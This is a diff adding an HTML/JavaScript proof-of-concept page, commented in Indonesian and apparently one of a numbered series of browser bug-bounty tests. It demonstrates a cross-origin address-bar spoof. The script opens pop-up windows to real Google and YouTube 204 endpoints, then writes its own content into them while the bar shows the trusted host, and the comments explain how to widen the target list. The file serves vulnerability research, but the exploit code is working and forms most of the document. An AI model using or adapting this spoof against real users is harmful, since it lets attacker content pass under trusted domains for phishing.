@@ -1,0 +1,40 @@
+<!-- 52 | ⭐ ABORT LINTAS-ORIGIN — inilah cara "bar menulis google.com, layar milikku" | [1-CLICK]
+     Kalau 51 menunjukkan build-mu gagal ke arah "TIDAK MUNDUR", maka file ini yang mengubahnya
+     jadi laporan mahal — karena URL yang tersangkut bisa kita PILIH, dan dia bukan milik kita.
+     MEKANISME  jendela dibuka, lalu dinavigasi ke endpoint 204 di host TARGET. Bar mencatat
+     host target di titik commit-pending. Abort datang. Kalau bar tidak mundur, ia tetap
+     menulis host target — sementara dokumennya masih initial empty document yang MEWARISI
+     origin kita, jadi document.write tetap boleh.
+     Hasilnya persis: address bar = situs orang, konten = halaman kita, nol XSS, nol UXSS.
+     Lima host disapu berdampingan supaya kamu tahu mana yang punya endpoint 204 hidup.
+     Perluas sendiri: daftar + cara mencarinya ada di 204-endpoints.txt.
+     ETIKA  GET biasa ke endpoint publik, satu kali, tanpa payload — persis seperti membuka tab.
+     Host yang boleh kamu sentuh saja. Nol form, nol kredensial, nol peniruan merek.
+     EXPECTED-SECURE  bar mundur ke about:blank begitu navigasi batal. -->
+<button onclick="go()">Run 52</button>
+<pre id=g style="font:12px/1.7 monospace"></pre>
+<script>
+var H = ['https://www.google.com/gen_204', 'https://www.gstatic.com/generate_204',
+  'https://clients3.google.com/generate_204', 'https://www.youtube.com/generate_204',
+  'https://connectivitycheck.gstatic.com/generate_204'];
+g.textContent = 'REAL ORIGIN: ' + location.href;
+function go() {
+  H.forEach(function (u, i) {
+    setTimeout(function () {
+      var w = window.open(u, '_blank', 'width=340,height=220,left=' + (20 + (i % 3) * 350) + ',top=' + (40 + Math.floor(i / 3) * 260));
+      if (!w) return;
+      setTimeout(function () {
+        try {
+          w.document.write('<div style="font:13px system-ui;padding:12px"><b>Konten ini milik ' + location.origin + '</b>' +
+            '<p style="font:11px monospace">bar di atas menulis apa?</p></div>');
+          w.document.close();
+        } catch (e) { }
+      }, 2400);
+    }, i * 800);
+  });
+  g.textContent = 'REAL ORIGIN: ' + location.origin + '\n5 jendela dibuka:\n' +
+    H.map(function (u, i) { return '  ' + (i + 1) + '. ' + u.replace('https://', '').padEnd(42) + 'bar: ______'; }).join('\n') +
+    '\n\nBar menulis HOST TUJUAN + isi tulisan kita = screenshot SEKARANG, lalu STOP.' +
+    '\nBar kosong = arah gagal yang satunya (tetap temuan, lihat 15).';
+}
+</script>
